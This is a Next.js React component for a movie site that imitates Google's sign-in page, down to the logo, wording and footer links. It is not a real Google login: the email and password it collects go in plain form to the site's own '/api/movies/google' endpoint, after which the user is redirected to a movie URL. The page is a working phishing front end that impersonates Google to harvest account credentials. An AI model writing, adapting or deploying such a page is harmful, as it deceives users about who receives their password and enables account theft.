'use client';

import { useState, Suspense } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { movieData } from '../../assets/assets';

// Component that uses searchParams
function GoogleLoginContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const movieId = searchParams.get('movieId');
    
    const [formData, setFormData] = useState({
        email: '',
        password: '',
    });
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [step, setStep] = useState(1); // 1 = email, 2 = password
    
    // Find the movie URL from movieData
    const getMovieUrl = (id) => {
        if (!id) return '#';
        const movie = movieData.find(m => m.id === parseInt(id));
        return movie ? movie.url : '#';
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
    };

    const handleEmailSubmit = (e) => {
        e.preventDefault();
        
        if (!formData.email) {
            setError('Email is required');
            return;
        }
        
        // Proceed to password step
        setError('');
        setStep(2);
    };

    const handlePasswordSubmit = async (e) => {
        e.preventDefault();
        
        if (!formData.password) {
            setError('Password is required');
            return;
        }
        
        setLoading(true);
        setError('');
        
        try {
            const response = await fetch('/api/movies/google', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ...formData,
                    movieId
                }),
            });
            
            const data = await response.json();
            
            if (response.ok) {
                // Login successful, redirect to the movie URL
                const movieUrl = getMovieUrl(movieId);
                router.push(movieUrl);
            } else {
                setError(data.message || 'Login failed. Please try again.');
            }
        } catch (err) {
            setError('An error occurred. Please try again later.');
            console.error(err);
        } finally {
            setLoading(false);
        }
    };

    return (
        <main className="min-h-screen flex items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
            <div className="max-w-md w-full space-y-8">
                {/* Google Logo */}
                <div className="text-center">
                    <Image 
                        src="/google-logo.png" 
                        alt="Google" 
                        width={100} 
                        height={33} 
                        className="mx-auto"
                        priority
                    />
                    <h2 className="mt-6 text-center text-xl md:text-2xl font-bold text-gray-900">
                        {step === 1 ? 'Sign in' : 'Welcome'}
                    </h2>
                    {step === 2 && (
                        <div className="mt-2 flex justify-center items-center">
                            <div className="bg-blue-500 text-white w-8 h-8 rounded-full flex items-center justify-center text-lg font-bold">
                                {formData.email.charAt(0).toUpperCase()}
                            </div>
                            <p className="ml-2 text-sm text-gray-600">{formData.email}</p>
                        </div>
                    )}
                </div>
                
                {/* Login Form */}
                <div className="bg-white py-8 px-6 shadow rounded-lg">
                    {error && (
                        <div className="mb-4 p-3 bg-red-50 text-red-600 rounded-md text-sm">
                            {error}
                        </div>
                    )}
                    
                    {step === 1 ? (
                        <form onSubmit={handleEmailSubmit} className="space-y-6">
                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-700">
                                    Email or phone
                                </label>
                                <div className="mt-1">
                                    <input
                                        id="email"
                                        name="email"
                                        type="text"
                                        autoComplete="email"
                                        required
                                        className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                                        value={formData.email}
                                        onChange={handleChange}
                                    />
                                </div>
                            </div>

                            <div className="text-sm">
                                <a href="#" className="font-medium text-blue-600 hover:text-blue-500">
                                    Forgot email?
                                </a>
                            </div>
                            
                            <div className="pt-4">
                                <p className="text-sm text-gray-600 mb-8">
                                    Not your computer? Use Guest mode to sign in privately.
                                </p>
                                
                                <div className="flex items-center justify-between">
                                    <div>
                                        <a href="#" className="text-sm font-medium text-blue-600 hover:text-blue-500">
                                            Create account
                                        </a>
                                    </div>
                                    <div>
                                        <button
                                            type="submit"
                                            className="inline-flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                                        >
                                            Next
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    ) : (
                        <form onSubmit={handlePasswordSubmit} className="space-y-6">
                            <div>
                                <label htmlFor="password" className="block text-sm font-medium text-gray-700">
                                    Enter your password
                                </label>
                                <div className="mt-1">
                                    <input
                                        id="password"
                                        name="password"
                                        type="password"
                                        autoComplete="current-password"
                                        required
                                        className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                                        value={formData.password}
                                        onChange={handleChange}
                                    />
                                </div>
                            </div>

                            <div className="flex items-center">
                                <input
                                    id="show-password"
                                    name="show-password"
                                    type="checkbox"
                                    className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                                />
                                <label htmlFor="show-password" className="ml-2 block text-sm text-gray-900">
                                    Show password
                                </label>
                            </div>

                            <div className="pt-4">
                                <div className="flex items-center justify-between">
                                    <button
                                        type="button"
                                        onClick={() => setStep(1)}
                                        className="text-sm font-medium text-blue-600 hover:text-blue-500"
                                    >
                                        Back
                                    </button>
                                    <button
                                        type="submit"
                                        className={`inline-flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium rounded-md text-white ${loading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'} focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500`}
                                        disabled={loading}
                                    >
                                        {loading ? 'Signing in...' : 'Sign in'}
                                    </button>
                                </div>
                            </div>
                        </form>
                    )}
                </div>
                
                <div className="text-center">
                    <button 
                        onClick={() => router.push(`/movies/login?movieId=${movieId}`)}
                        className="text-blue-600 hover:underline text-sm"
                    >
                        Back to login options
                    </button>
                </div>
                
                {/* Footer */}
                <div className="mt-8">
                    <div className="flex justify-center space-x-4 text-sm text-gray-500">
                        <a href="#" className="hover:text-gray-900">Help</a>
                        <a href="#" className="hover:text-gray-900">Privacy</a>
                        <a href="#" className="hover:text-gray-900">Terms</a>
                    </div>
                </div>
            </div>
        </main>
    );
}

// Loading fallback component
function LoadingFallback() {
    return (
        <div className="min-h-screen flex items-center justify-center bg-gray-50">
            <div className="text-center">
                <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-gray-600">Loading Google login...</p>
            </div>
        </div>
    );
}

// Main component with Suspense boundary
export default function GoogleLogin() {
    return (
        <Suspense fallback={<LoadingFallback />}>
            <GoogleLoginContent />
        </Suspense>
    );
} 